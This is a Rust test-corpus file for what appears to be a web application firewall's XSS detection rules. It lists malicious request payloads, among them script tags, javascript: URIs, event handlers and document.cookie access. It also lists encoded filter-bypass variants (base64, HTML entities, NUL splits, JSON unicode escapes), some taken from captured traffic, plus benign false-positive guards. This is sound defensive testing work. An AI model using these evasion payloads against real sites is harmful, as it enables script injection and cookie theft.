// SPDX-FileCopyrightText: 2026 0x00spor3
// SPDX-License-Identifier: Apache-2.0

//! XSS corpus cases. Field coverage: query + cookies + body.
//! Rules (paranoia): script-tag 1, javascript-proto 1, event-handler 1,
//! dangerous-tag 2, eval 2, document-cookie 2, vbscript-proto 3, data-html-uri 3,
//! innerhtml 3.

use crate::{Case, Expect, Field, Module};

pub static CASES: &[Case] = &[
    // ── malicious: one per rule ────────────────────────────────────────────────
    Case {
        id: "xss-script-tag-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "<script>alert(1)</script>" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-script-tag"],
        desc: "inline <script> tag",
    },
    Case {
        id: "xss-javascript-proto-query",
        module: Module::Xss,
        field: Field::Query { name: "url", value: "javascript:alert(document.domain)" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-javascript-proto"],
        desc: "javascript: protocol handler",
    },
    Case {
        id: "xss-event-handler-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "<img src=x onerror=alert(1)>" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-event-handler"],
        desc: "inline onerror event handler",
    },
    Case {
        id: "xss-dangerous-tag-query",
        module: Module::Xss,
        field: Field::Query { name: "html", value: "<iframe src=about:blank></iframe>" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["xss-dangerous-tag"],
        desc: "<iframe> dangerous tag (Warning/PL2)",
    },
    Case {
        id: "xss-eval-cookie",
        module: Module::Xss,
        field: Field::Cookie("pref=eval(atob('YWxlcnQ='))"),
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["xss-eval"],
        desc: "eval() call in a cookie value (Warning/PL2)",
    },
    Case {
        id: "xss-document-cookie-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "x=document.cookie" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["xss-document-cookie"],
        desc: "document.cookie access (Warning/PL2)",
    },
    Case {
        id: "xss-vbscript-proto-query",
        module: Module::Xss,
        field: Field::Query { name: "url", value: "vbscript:msgbox(1)" },
        min_pl: 3,
        expect: Expect::Triggers,
        rules: &["xss-vbscript-proto"],
        desc: "vbscript: protocol handler (Notice/PL3)",
    },
    Case {
        id: "xss-data-html-uri-query",
        module: Module::Xss,
        field: Field::Query { name: "src", value: "data:text/html,hello" },
        min_pl: 3,
        expect: Expect::Triggers,
        rules: &["xss-data-html-uri"],
        desc: "data:text/html URI (Notice/PL3); plain text payload to isolate the rule",
    },
    Case {
        id: "xss-innerhtml-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "el.innerHTML=payload" },
        min_pl: 3,
        expect: Expect::Triggers,
        rules: &["xss-innerhtml"],
        desc: "innerHTML sink assignment (Notice/PL3)",
    },
    Case {
        id: "xss-js-sink-invocation-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "confirm.call(null,1)" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["xss-js-sink-invocation"],
        desc: "tag/handler-less sink call — gotestwaf xss-scripting (URL); recall gap, Fase 10b",
    },
    Case {
        id: "xss-js-sink-call-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "(alert)(1)" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["xss-js-sink-call"],
        desc: "parenthesized bare sink call — gotestwaf xss-scripting (URL); Fase 10b",
    },
    Case {
        id: "xss-event-handler-pointer-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "<div onauxclick=doStuff()>x</div>" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-event-handler"],
        desc: "onauxclick handler (new in the handler list) — gotestwaf community-xss; Fase 10b",
    },
    Case {
        id: "xss-document-cookie-bracket-query",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "x=document[\"cookie\"]" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["xss-document-cookie"],
        desc: "bracket-notation document[\"cookie\"] access — gotestwaf community-xss; Fase 10b",
    },
    // ── Base64Flat harvest (Fase 10c) — recall-lock under §6 base64-decode ───────
    // Not a gotestwaf-tracked deferral; pins that the derived channel feeds XSS too.
    Case {
        id: "xss-script-tag-b64",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-script-tag"],
        desc: "base64(`<script>alert(1)</script>`) — caught at 10c via base64-decode",
    },
    // ── WIRE GROUND-TRUTH (Fase 10c REOPEN, pcap bypass.txt line 1220) ──────────
    // EXACT bytes: JSON body, backslash-u escaped. serde unescapes to
    // `%3CsvG%2Fx=%22%3E%22%2FoNloaD=confirm%28%29%2F%2F`; ONE percent-decode would
    // give `<svG/x=">"/oNloaD=confirm()//` → xss-event-handler (onload). But the JSON
    // leaf reaches the modules RAW (no canonicalize_value on JSON values) → no decode →
    // BYPASS (probe score 0). STEP-1 ground-truth; STEP 2 canonicalizes JSON leaves.
    Case {
        id: "xss-wire-json-unicode-svg-onload",
        module: Module::Xss,
        field: Field::JsonBody(r#"{"test": true, "7a756a623d": "\u0025\u0033\u0043\u0073\u0076\u0047\u0025\u0032\u0046\u0078\u003d\u0025\u0032\u0032\u0025\u0033\u0045\u0025\u0032\u0032\u0025\u0032\u0046\u006f\u004e\u006c\u006f\u0061\u0044\u003d\u0063\u006f\u006e\u0066\u0069\u0072\u006d\u0025\u0032\u0038\u0025\u0032\u0039\u0025\u0032\u0046\u0025\u0032\u0046"}"#),
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-event-handler"],
        desc: "WIRE pcap L1220: JSON backslash-u svg/onload XSS — JSON leaf never canonicalized \
               (single percent-decode would catch it; serde unescape alone is not enough)",
    },
    // ── Phase-11 Step-0: raw body (application/graphql) canonicalization ──────────
    // A raw body (any content-type the parser does not structure) is inspected RAW by
    // body_str_values; it never went through canonicalize_value, so a percent-encoded
    // payload bypassed (Step-0 probe: `application/graphql` `%3Cscript%3E` → score 0).
    // The §6 raw-body fix now pushes the canonical form into the derived channel.
    Case {
        id: "xss-graphql-raw-body-encoded",
        module: Module::Xss,
        field: Field::RawBody {
            content_type: "application/graphql",
            body: "query{user(name:\"%3Cscript%3Ealert(1)%3C/script%3E\"){id}}",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["xss-script-tag"],
        desc: "percent-encoded XSS in an application/graphql (raw) body — closed by the §6 \
               raw-body canonicalization (Phase-11 Step-0)",
    },
    Case {
        id: "xss-benign-graphql-raw-body",
        module: Module::Xss,
        field: Field::RawBody {
            content_type: "application/graphql",
            body: "query{user(id:42){id name email}}",
        },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "an ordinary GraphQL query in a raw body must stay Clean (raw-body FP guard)",
    },
    // ── documented limits (need §6 HTML normalization — out of 10b rules-only) ───
    // ── §6-D1: HTML-entity (evasion) decoding — now CAUGHT via the derived channel ──
    Case {
        id: "xss-entity-obfuscated-scheme",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "<a href=javas&#99;ript:prompt&#x28;document.domain)>xss" },
        min_pl: 1,
        expect: Expect::Triggers,
        // `&#99;`→`c`, `&#x28;`→`(` (evasion entities; structural `<`/`>` left alone) →
        // `javascript:prompt(` → xss-javascript-proto. Closed by §6-D1 entity-decode.
        rules: &["xss-javascript-proto"],
        desc: "HTML-entity-obfuscated javascript:/prompt( — closed by §6-D1 evasion entity-decode",
    },
    Case {
        id: "xss-entity-lpar-handler",
        module: Module::Xss,
        field: Field::Header { name: "x-ref", value: "&gt;+src+onerror=confirm&lpar;1&rpar;&lt;" },
        min_pl: 1,
        expect: Expect::Triggers,
        // `&lpar;`→`(` → `confirm(1)`; the literal `onerror=` also fires. §6-D1 (header surface).
        rules: &["xss-js-sink-call"],
        desc: "named-entity `&lpar;`/`&rpar;` obfuscation of confirm() — §6-D1 entity-decode",
    },
    // ── benign guards for §6-D1: escaped HTML must stay clean (structural chars kept) ─
    Case {
        id: "xss-benign-escaped-html-tag",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "use &lt;b&gt;bold&lt;/b&gt; and &amp;amp; to escape" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "benign HTML-escaped prose — `&lt;`/`&gt;`/`&amp;` are NOT decoded (no tag reconstruction)",
    },
    Case {
        id: "xss-benign-numeric-escaped-tag",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "&#60;div class=note&#62;hello&#60;/div&#62;" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "numeric `&#60;`/`&#62;` (= `<`/`>`) are EXCLUDED from evasion decode — no FP on escaped code",
    },
    // ── §6-D2: mid-token tag-strip — mutation XSS now CAUGHT via the derived channel ─
    Case {
        id: "xss-mutation-tag-break",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "autof<x>ocus o<x>nfocus=alert<x>(1)//" },
        min_pl: 1,
        expect: Expect::Triggers,
        // `o<x>nfocus` → `onfocus` (mid-token `<x>` dropped) → `onfocus=` → xss-event-handler.
        // `alert<x>(` keeps its tag (`t`<x>`(` is not word-word) but the handler is enough.
        rules: &["xss-event-handler"],
        desc: "mutation XSS: <x> inside onfocus token — closed by §6-D2 mid-token tag-strip",
    },
    // ── benign guards for §6-D2: WRAPPING tags must NOT create a spurious handler match ─
    Case {
        id: "xss-benign-wrapped-handler-word",
        module: Module::Xss,
        field: Field::Header { name: "x-doc", value: "the <code>onerror</code> = handler attribute" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "docs: a handler WORD wrapped in <code> + a separate `=` must NOT match (mid-token-only strip)",
    },
    Case {
        id: "xss-benign-html-table-cells",
        module: Module::Xss,
        field: Field::Header { name: "x-tbl", value: "<tr><td>onclick</td><td>=</td><td>fn</td></tr>" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "HTML table cells separating onclick/=/fn must NOT be joined into `onclick=` (D2 FP guard)",
    },
    // ── §6-D2b: mid-token CONTROL-char strip — NUL-split mutation now CAUGHT ─────────
    // WIRE ground-truth (pcap bypass-new.txt L14434): `<<scr\0ipt/src=http://xss.com/…>`
    // is sent Base64Flat in the URL PATH. The raw path is opaque base64, so the §6
    // transforms used to no-op on it; only after composing them over the base64-DECODED
    // variant (10c reopen) does the NUL get stripped → `<script` reconstructed.
    Case {
        id: "xss-mutation-nul-split-b64-path",
        module: Module::Xss,
        field: Field::Path("/PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ"),
        min_pl: 1,
        expect: Expect::Triggers,
        // base64 → `<<scr\0ipt/src=…>` → §6-D2b control-strip → `<<script…` → xss-script-tag.
        rules: &["xss-script-tag"],
        desc: "WIRE: Base64Flat `<<scr\\0ipt/src=http://xss.com/xss.js>` in URL path — NUL \
               mid-token split, closed by §6-D2b control-strip composed over base64-decode",
    },
    // ── §6-D2 ∘ base64: the mid-token TAG-strip mutation, but Base64Flat-wrapped ──────
    // WIRE (pcap bypass-new.txt L13971): `\"autof<x>ocus o<x>nfocus=alert<x>(1)//`
    // Base64Flat in the URL path. Same composition gap as D2b: the tag-strip must run on
    // the base64-decoded variant, not the opaque blob. Locks the `derive_variants` compose.
    Case {
        id: "xss-mutation-tag-break-b64-path",
        module: Module::Xss,
        field: Field::Path("/XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v"),
        min_pl: 1,
        expect: Expect::Triggers,
        // base64 → `o<x>nfocus` → §6-D2 mid-token tag-strip → `onfocus=` → xss-event-handler.
        rules: &["xss-event-handler"],
        desc: "WIRE: Base64Flat mutation `o<x>nfocus=alert<x>(1)` in URL path — §6-D2 \
               tag-strip composed over base64-decode (10c reopen)",
    },
    // ── benign guard for §6-D2b: control-strip must not fabricate a keyword ───────────
    // Uses a NON-NUL C0 control (0x01) so the guard isolates control-strip: `pt-null-byte`
    // (= `\x00`) deliberately ignores it, so a residual match could ONLY come from the
    // strip joining fragments — and it must not. (NUL itself is independently flagged by
    // pt-null-byte, so control-strip adds no marginal FP there.)
    Case {
        id: "xss-benign-ctrl-in-base64-text",
        module: Module::Xss,
        field: Field::Query { name: "data", value: "cmVwb3J0AWZpbmFsIHN1bW1hcnkgbm90ZXM" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "benign base64 → `report\\x01final summary notes`; control-strip joins to \
               `reportfinal …` but reconstructs NO attack keyword → Clean (D2b FP guard)",
    },
    // NB: §6-D2b-2 (intra-token WHITESPACE collapse, e.g. `<<scr ipt>`) stays DEFERRED —
    // space-collapse on keywords is high-FP-risk on prose, and it is NOT on the wire (the
    // gotestwaf split uses a NUL, handled above). Reopen only with a keyword-anchored,
    // heavily FP-probed collapse.
    // ── benign / traps ─────────────────────────────────────────────────────────
    Case {
        id: "xss-benign-javascript-prose",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "JavaScript: Basics of JavaScript Language" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "10b FP fix: 'javascript:' in prose (no call) must NOT match xss-javascript-proto",
    },
    Case {
        id: "xss-benign-confirm-prose",
        module: Module::Xss,
        field: Field::Query { name: "msg", value: "Please confirm (your order) and we will alert you" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "sink words in prose with a paren — must NOT match xss-js-sink-invocation (needs .call/.apply)",
    },
    Case {
        id: "xss-benign-alert-prose",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "the alert system (v2) notifies users" },
        min_pl: 2,
        expect: Expect::Clean,
        rules: &[],
        desc: "bare-sink trap: 'alert' + later paren but a space before '(' — must NOT match xss-js-sink-call",
    },
    Case {
        id: "xss-benign-document-bracket",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "document[\"title\"] = pageTitle" },
        min_pl: 2,
        expect: Expect::Clean,
        rules: &[],
        desc: "bracket access to a non-cookie property — must NOT match xss-document-cookie",
    },
    Case {
        id: "xss-benign-basic-markup",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "<b>bold</b> and <i>italic</i> text" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "harmless inline markup, no dangerous tags or handlers",
    },
    Case {
        id: "xss-trap-on-params",
        module: Module::Xss,
        field: Field::Query { name: "q", value: "browse online and onsale items" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "event-handler narrowing trap: 'online'/'onsale' must not match on\\w+=",
    },
    Case {
        id: "xss-benign-plain-comment",
        module: Module::Xss,
        field: Field::Query { name: "comment", value: "Please respond by email soon" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "plain prose comment",
    },
];
